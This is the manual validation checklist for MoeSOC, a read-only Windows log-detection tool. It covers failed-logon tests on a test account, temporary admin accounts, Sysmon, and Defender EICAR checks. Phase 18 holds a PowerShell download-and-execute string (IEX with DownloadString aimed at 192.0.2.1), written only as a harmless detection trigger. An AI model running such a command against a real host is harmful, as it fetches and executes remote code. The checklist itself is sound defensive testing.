# Manual validation queue

Checks that need a person, a specific machine or software that is not available during automated work. Automated tests cover the logic of every item; these entries prove it on real Windows telemetry. Statuses: `PENDING`, `DONE`, `BLOCKED BY ENVIRONMENT`.

Safety for every item: MoeSOC only reads logs. No step below changes audit policy, disables protection or touches a real person's account. Use a dedicated test account and delete it afterwards.

---

## [x] Phase 1: DET-001 / COR-001 on real logons — DONE (Oct 7, 2026)

See [validation.md](validation.md). Optional remainder:

- [ ] **Network variant (type 3, expected MEDIUM confidence).** In a normal Command Prompt, run 6 times with a wrong password, then once with the right one: `net use \\127.0.0.1\IPC$ /user:%COMPUTERNAME%\moesoc-test`, then `net use \\127.0.0.1\IPC$ /delete`. Run `scripts\validate_real_auth.bat`. Expected: COR-001 with confidence MEDIUM (+2 network logon). Status: PENDING.

## [ ] Phase 2: domain aliases on a domain-joined computer

- **Why manual:** the development PC appears to be a workgroup computer: every account in its logs so far is local, so there is no NetBIOS/DNS domain pair to observe.
- **Steps (on a domain-joined test machine, read-only):**
  1. In PowerShell: `[System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName` and `$env:USERDOMAIN` — note the DNS and NetBIOS names.
  2. Run `scripts\elevated_scan.bat`.
  3. Run `.\.venv\Scripts\python.exe -m moesoc.cli events --domain <NETBIOS>` and `--domain <dns name>`. Note whether both spellings occur.
- **Expected:** findings for domain accounts show `domain_aliases` with reason "this computer's configuration" or "same authority SID".
- **Risk:** none (read-only). Status: BLOCKED BY ENVIRONMENT (no domain-joined machine available).

## [ ] Phase 3: DET-004 on real slow failures

- **Why manual:** it needs real wrong-password attempts spread over about an hour.
- **Steps:** with the test account `moesoc-test` (create it again if deleted), in a normal Command Prompt run `runas /user:%COMPUTERNAME%\moesoc-test cmd` with a **wrong** password once every 6 minutes, 10 times (about 54 minutes). Then run `scripts\validate_real_auth.bat` and `python -m moesoc.cli --data-dir .verify-data detections`.
- **Expected:** one DET-004 finding (mode identity, failure_count 10, interval about 360 s, regular_interval may be false because a person types at slightly different times); no DET-001 finding for those attempts.
- **Risk:** stays below the lockout limit (10 per 10 minutes). Status: PENDING.

## [ ] Phases 4–6: account creation, admin group and COR-002 on real events

- **Why manual:** it creates a local account and gives it admin rights, which only you should do, on your own PC.
- **Steps (admin PowerShell):**
  1. `net user moesoc-temp * /add` (enter a throwaway password).
  2. Within a few minutes: `net localgroup Administrators moesoc-temp /add` (on a non-English Windows, use the local name of the group, e.g. `Administratoren`).
  3. Run `scripts\elevated_scan.bat`, then `.\.venv\Scripts\python.exe -m moesoc.cli detections`.
  4. Clean up immediately: `net localgroup Administrators moesoc-temp /delete` and `net user moesoc-temp /delete`.
- **Expected:** DET-005 (LOW) for the new account, DET-006 (HIGH, group recognised by SID S-1-5-32-544) and COR-002 (HIGH/HIGH) with both record IDs and the seconds between them.
- **Risk:** a temporary admin account exists for a few minutes; use a strong password and delete it right after. Status: PENDING.

## [ ] Phase 7: 4672 context on a real privileged logon

- **Why manual:** needs real failed and successful logons by an **administrator** test account.
- **Steps:** during the Phase 4–6 test, while `moesoc-temp` is still in Administrators: run `runas /user:%COMPUTERNAME%\moesoc-temp cmd` 6 times with a wrong password, then once with the right one. Run `scripts\validate_real_auth.bat`, then `.\.venv\Scripts\python.exe -m moesoc.cli --data-dir .verify-data show <COR-001 id>`. Then delete the account as described above.
- **Expected:** COR-001 shows `privileged_session` with the 4672 record and risk 80 (`risk_factors`: 70 base + 10 privileged session). With UAC, an admin's interactive logon is split into a filtered and an elevated session; MoeSOC follows the 4624's `TargetLinkedLogonId` to the elevated session's 4672 (tested on fixtures). Record what you observe.
- **Risk:** temporary admin account; delete it right after. Status: PENDING.

## [ ] Phase 8: 4688 on real process events

- **Why manual:** process-creation auditing is usually off on home PCs, and enabling it is your decision (MoeSOC never changes audit policy).
- **Check (admin PowerShell, read-only):** `auditpol /get /subcategory:{0CCE922B-69AE-11D9-BED3-505054503030}` (Process Creation; the GUID works in every language).
- **Optional, your choice:** to enable it: `auditpol /set /subcategory:{0CCE922B-69AE-11D9-BED3-505054503030} /success:enable`; for command lines, Group Policy "Include command line in process creation events" (or registry `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit\ProcessCreationIncludeCmdLine_Enabled = 1`). Revert with `/success:disable`.
- **Then:** open Notepad, run `scripts\elevated_scan.bat`, and in MoeSOC filter Events by event ID 4688.
- **Expected:** a 4688 for notepad.exe with your account, logon ID, parent (explorer.exe), elevation Limited, integrity Medium; command line shown, or "Unavailable" if that policy is off.
- **Risk:** more Security-log volume. Status: PENDING.

## [ ] Phase 9: incremental collection on the real log

- **Why manual:** proves the record-ID watermark against the real Security log.
- **Steps:** run `scripts\elevated_scan.bat` twice, a few minutes apart (it scans twice itself; the second scan of each run is incremental).
- **Expected:** the first scan of a fresh database prints `Collection : core: bootstrap, process: bootstrap`; later scans print `core: incremental` and read only the records written since.
- **Not to be done:** recovery after a log clear is unit-tested only. Do **not** clear your Security log to test it; that destroys audit evidence.
- **Risk:** none (read-only). Status: PENDING.

## [ ] Phase 10: live monitoring with a real subscription

- **Why manual:** the Security log subscription needs administrator rights (UAC approval).
- **Steps:** start MoeSOC from the Desktop shortcut (approve the prompt), click **Live: OFF**. Wait for **Live: ON**. Lock the screen and type one wrong password, then sign in. Within a few seconds the status line should show "Live · N new records". Click the button again to stop (**OFF**).
- **Expected:** STARTING → ON; new 4625/4624 events appear in Events without pressing Scan Now; stopping returns to OFF quickly. Optional: 5+ wrong passwords produce a DET-001 finding live.
- **Risk:** none (read-only). Status: PENDING.

## [ ] Phases 11–18: Sysmon telemetry on a real machine

- **Why manual:** Sysmon is not installed on the development PC, and installing it is your decision.
- **Steps:** follow [sysmon.md](sysmon.md) (built-in feature or standalone, with a config you chose). Then open MoeSOC → Overview → Telemetry Health: expect **Sysmon · Available** with the variant and service state. Later phases add Sysmon collection; their checks are listed under each phase.
- **Risk:** a kernel driver and more log volume; follow your own change process. Status: BLOCKED BY ENVIRONMENT (Sysmon not installed).

## [ ] Phase 18: PowerShell 4104 and DET-007 on a real machine

- **Why manual:** depends on your PowerShell logging policy; enabling it is your decision.
- **Check (read-only):** MoeSOC → Overview → Telemetry Health → **PowerShell Logging**: says whether Script Block Logging is enabled by policy.
- **Optional, your choice:** enable it with Group Policy (*Administrative Templates → Windows Components → Windows PowerShell → Turn on PowerShell Script Block Logging*) or registry `HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging = 1`. It increases log volume and records script contents (which may contain secrets).
- **Benign test (no download, nothing runs):** in a normal PowerShell window: `$t = "IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.1/x')"; $t.Length` — the text is only a string, but it is logged as a script block. Then run `scripts\elevated_scan.bat`.
- **Expected:** Events (source powershell, ID 4104) shows "PowerShell script block run by S-1-5-21-…"; DET-007 MEDIUM with indicator "download_execute" and a short excerpt; the full text appears only in the raw XML.
- **Risk:** none from the test (192.0.2.1 is a documentation address and nothing is executed). Status: PENDING.

## [ ] Phases 19–20: Defender detection and remediation with the EICAR test file

- **Why manual:** needs a real Defender detection on your PC. The EICAR file is a harmless, industry-standard test string that every antivirus detects; it is not malware.
- **Steps:** follow Microsoft's own instructions for the EICAR test (or create a text file containing the official EICAR test string from eicar.org) in a folder such as `Downloads\moesoc-test`. Defender should detect and quarantine it within seconds. Then run `scripts\elevated_scan.bat` and open Detections.
- **Expected:** one **DET-008** finding "Microsoft Defender detected Virus:DOS/EICAR_Test_File", severity HIGH (Defender severity Severe), remediation **Remediated: Defender reports action 'Quarantine' succeeded**, with the file path, your user and the process. Events (source defender) shows 1116 and 1117. Running the scan again does not create a second finding.
- **Do not:** disable Defender, add exclusions or allow the threat to test the other states; those are unit-tested only.
- **Clean-up:** remove the quarantined item in Windows Security → Protection history if you want.
- **Risk:** none (test string). Status: PENDING.

## [ ] Phase 21: cross-source correlation on real telemetry

- **Why manual:** COR-003 needs a real failed-then-successful logon followed by activity in that session; COR-004 needs Sysmon (file-create logging) plus a Defender detection. Sysmon is not installed on the development PC.
- **COR-004 (after installing Sysmon with a config that logs file creation in Downloads, your choice):** repeat the EICAR test from Phases 19–20 by downloading the test file in a browser. Run `scripts\elevated_scan.bat`.
  - **Expected:** DET-008 **and** COR-004 "Defender Detection Traced to Its Source", written by your browser process, with its DNS lookups/connections if Sysmon logged them, remediation "remediated".
- **COR-003 (optional, with the test account):** lock the screen, type a wrong password for `moesoc-test` 6 times, sign in, then in that session run `net user moesoc-tmp2 /add` in an **elevated** prompt of that account (requires the account to be an administrator; skip if it is not) and delete it afterwards with `net user moesoc-tmp2 /delete`.
  - **Expected:** COR-001 and COR-003 with chain "6 failed logons → Successful logon → User account … created", link "logon_id · exact". Note: elevated prompts run in the linked (elevated) logon session, which COR-003 follows via the 4624 linked logon ID.
- **Do not** weaken any setting to produce these events. Status: BLOCKED BY ENVIRONMENT (Sysmon not installed) / PENDING.

## [ ] Phase 25: retention on your real database

- **Why manual:** checks the dialog and that only MoeSOC's copy is affected.
- **Steps:** MoeSOC → Settings → Data Retention: choose 7 days → **Preview** (read the counts) → **Delete old data…** → **Cancel**. Nothing should change. Optional: once your stored data is older than 7 days, repeat and confirm.
- **Expected:** the preview names counts and says Windows event logs are not touched; Cancel deletes nothing; after confirming, Event Viewer still shows the same Security log (MoeSOC never touches it).
- **Risk:** deletes MoeSOC data only after you confirm. Status: PENDING.

## [ ] Phase 26: tuning on your PC

- **Steps:** Detections → select a finding → **Suppress…** → reason → OK; Tuning page shows it as Active with 0 hits. Run `scripts\elevated_scan.bat`; if the same activity repeats, hits increase and no new finding appears. Remove it with a reason; it stays listed under "Show removed and expired". Disable and re-enable a rule; check the audit log.
- **Expected:** all four actions appear in the audit log with reasons; existing findings unchanged.
- **Risk:** none (MoeSOC settings only). Status: PENDING.

## [ ] Phase 31: packaged executable and installer

- **Why manual:** the real UAC prompt needs you; the installer needs Inno Setup, which you decide whether to install.
- **Executable (already built):** double-click `dist\MoeSOC\MoeSOC.exe`, approve the UAC prompt. Expected: MoeSOC opens elevated (Overview: administrator), the taskbar shows the shield icon (not Python's). Double-click it again: the open window comes to the front, no second copy, no second prompt. Optional: decline the prompt once — MoeSOC opens and says it is not elevated.
- **Installer (optional):** `winget install -e --id JRSoftware.InnoSetup`, then run `scripts\build_installer.bat` again. Expected: `dist\installer\MoeSOC-Setup-x64.exe`. Install it, start from the Start menu, then uninstall and check that `%LOCALAPPDATA%\MoeSOC` is still there.
- **Note:** the executable is unsigned, so Windows SmartScreen may warn the first time ("More info" → "Run anyway").
- **Risk:** low (installs into Program Files; uninstall keeps your data). Status: PENDING / installer BLOCKED BY ENVIRONMENT.

## [ ] Privacy before publishing

- **Why manual:** only you can decide what is shown publicly.
- Older commits contain GUI screenshots (`docs/screenshots/01–07`) whose header shows this PC's name. New screenshots taken by `gui_smoke.py` replace the name with `WORKSTATION`.
- **Steps:** run `scripts\verify_windows.bat` once (regenerates the screenshots with the name hidden); before pushing to a public repository, decide whether to rewrite history (for example `git filter-repo`) or start a fresh public history.
- Real-validation screenshots (`docs/screenshots/real-*.png`) are git-ignored and stay on your PC.
- Status: PENDING.

## [ ] Clean-up

- Delete the test account: `net user moesoc-test /delete` (admin PowerShell). Status: PENDING.
- Delete the leftover folders `.verify-data\launcher-test` and `.verify-data\diag`. Status: PENDING.

---

## Final independent audit (2026-10-08): items found during the audit

Details are in [MoeSOC_Final_Validation_Report.md](MoeSOC_Final_Validation_Report.md). Fields: Phase / Feature / Why manual / Exact steps / Expected / Risk / Status.

### [ ] A-M1: real network brute force from a second machine

- **Phase:** 1 / 4 (DET-001, DET-004, COR-001).
- **Why manual:** during the audit, six `net use \\127.0.0.1\IPC$ /user:moesoc-audit-nouser <wrong password>` attempts all failed as intended (exit code 2). The next scan read only **1** new Security record, so loopback SMB does not produce the six 4625 records the Phase 1 network variant assumes. A second machine is needed.
- **Exact steps:**
  1. From another PC or VM on the LAN, run `net use \\<test-PC-IP>\IPC$ /user:<test-PC>\moesoc-test <wrong password>` 6 times, then once with the right password, then `net use \\<test-PC-IP>\IPC$ /delete`.
  2. Run `scripts\elevated_scan.bat`.
- **Expected:** DET-001 with logon type Network and the remote IP. COR-001 with confidence MEDIUM or HIGH (+2 network, +1 remote, +1 same IP).
- **Risk:** stays below lockout (10 per 10 min). Use the test account only.
- **Status:** PENDING.

### [ ] A-M2: live monitoring receives a real event

- **Phase:** 10 (fix A-4).
- **Why manual:** the A-4 fix (drain on open, then drain on each signal) is tested against a fake pywin32 layer only. One real run of `scripts\validate_live_delivery.bat` (2026-10-09, on the fixed code) reached ON in 0.26 s, stopped, restarted and stored no duplicates, but proved nothing about delivery: Windows wrote **no** Event 4688 for the test process (process-creation auditing is off on this PC), so there was nothing to deliver. The script now reports that case as INCONCLUSIVE.
- **Exact steps (no policy change, no account creation, MoeSOC types no password):**
  1. Start MoeSOC elevated and switch **Live** on. Note the event count on the Events page.
  2. Lock the screen (Win+L), type a wrong password for your own account twice, then log in normally.
  3. Within about 10 s, without pressing Scan, the Events page must show the two new Event 4625 records.
  4. Switch Live off and on again: the count must not change (no duplicates).
- **Expected:** Live stays ON; exactly two new 4625 records appear; no duplicates.
- **Risk:** none (two wrong passwords stay far below lockout).
- **Status:** PENDING (A-4 IMPLEMENTED / AUTOMATED TESTED — REAL DELIVERY VALIDATION PENDING).

### [ ] A-M3: packaged exe second instance and visual check

- **Phase:** 31.
- **Why manual:** the audit's exe step had a quoting error in the audit script itself; the fixed `audit\audit_exe.bat` could not be started. The exe window was also masked to the audit tooling.
- **Exact steps:**
  1. Start `dist\MoeSOC\MoeSOC.exe` and approve UAC.
  2. Double-click `audit\audit_exe.bat` while it runs, and read `audit\out\exe2.txt`.
  3. Check the taskbar icon and all 9 pages.
- **Expected:** self-test PASSED. The second start brings the first window to the front without a second UAC prompt; `tasklist` shows one `MoeSOC.exe` instance (plus any child process). Peak memory is recorded in `audit\out\benchmark_audit_mem.json`.
- **Risk:** none.
- **Status:** PENDING.

### [ ] A-M4: DET-006 / COR-002 positive on real events

- **Phase:** 5–6.
- **Why manual:** it changes local group membership, which is the owner's decision.
- **Exact steps:**
  1. Elevated Command Prompt: `net user moesoc-test2 <strong password> /add`.
  2. `net localgroup Administrators moesoc-test2 /add`.
  3. Run `scripts\elevated_scan.bat`.
  4. `net localgroup Administrators moesoc-test2 /delete` and `net user moesoc-test2 /delete`.
- **Expected:** DET-005, DET-006 (HIGH, group S-1-5-32-544) and COR-002 (HIGH).
- **Risk:** a temporary local admin account; remove it immediately.
- **Status:** PENDING.

### [ ] A-M5: decisions for the owner

- **Script Block Logging (DET-007 real positive):** REAL 4104 VALIDATION BLOCKED — SCRIPT BLOCK LOGGING DISABLED. Enable only if you choose to (see Phase 18 above).
- **EICAR (DET-008 / COR-004):** REAL DEFENDER DETECTION VALIDATION PENDING (see Phases 19–20).
- **Sysmon:** NOT AVAILABLE ON TEST MACHINE (see Phases 11–18).
- **Inno Setup:** BLOCKED BY ENVIRONMENT — INNO SETUP NOT INSTALLED.
- **GitHub CI:** GITHUB CI NOT ACTUALLY RUN (no remote).

### [ ] A-M6: privacy before publishing (updated)

- **Finding:** git history (commits `1390eb1`, `eff8a1c`, `d3b9be6`) contains screenshots showing the real computer name. The current tree is clean.
- **Steps:** publish from a fresh repository, or remove those blobs with `git filter-repo`. Verify with `git rev-list --all --objects | findstr png`.
- **Status:** PENDING (the owner's decision; the audit did not rewrite history).

### [ ] A-M7: clean up the audit artifacts

- `audit\out\scan-copy\moesoc.db` holds **real** events. Keep it private, or delete the `audit` folder when done.
- The audit made 12 failed `net use` attempts for non-existent accounts (`moesoc-audit-nouser`, `moesoc-audit-live`). They changed nothing; no clean-up is needed.
